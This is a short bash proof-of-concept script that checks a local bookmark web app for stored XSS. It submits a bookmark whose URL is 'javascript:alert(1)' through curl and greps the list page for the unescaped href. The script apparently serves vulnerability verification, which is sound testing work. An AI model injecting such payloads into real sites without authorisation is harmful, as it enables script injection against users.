#!/bin/bash

# Create HTML file to serve as a POC that demonstrates stored XSS vulnerability
# This POC uses curl to:
# 1. Add a bookmark with javascript: protocol
# 2. Verify it's displayed in the response without proper escaping

COOKIES="/tmp/xss_poc_cookies.txt"
rm -f "$COOKIES"

echo "[*] Step 1: Initialize session on /list"
curl -c "$COOKIES" "http://localhost:5000/list" -s > /dev/null

echo "[*] Step 2: Add bookmark with javascript:alert(1) URL"
curl -b "$COOKIES" -c "$COOKIES" -X POST "http://localhost:5000/add" \
  -d "name=XSSTest&url=javascript:alert(1)" \
  -s > /dev/null

echo "[*] Step 3: Retrieve list and check if javascript:alert(1) appears in href"
RESPONSE=$(curl -b "$COOKIES" "http://localhost:5000/list" -s)

# Check if the unescaped javascript: is in href attribute
if echo "$RESPONSE" | grep -q 'href="javascript:alert(1)"'; then
    echo "[+] STORED XSS CONFIRMED: javascript:alert(1) found unescaped in href attribute"
    echo "[+] Vulnerable HTML snippet:"
    echo "$RESPONSE" | grep 'href="javascript:alert(1)"' | head -1
    exit 0
else
    echo "[-] XSS not found in expected form"
    echo "Response contains:"
    echo "$RESPONSE" | grep "javascript\|XSSTest" | head -5
    exit 1
fi
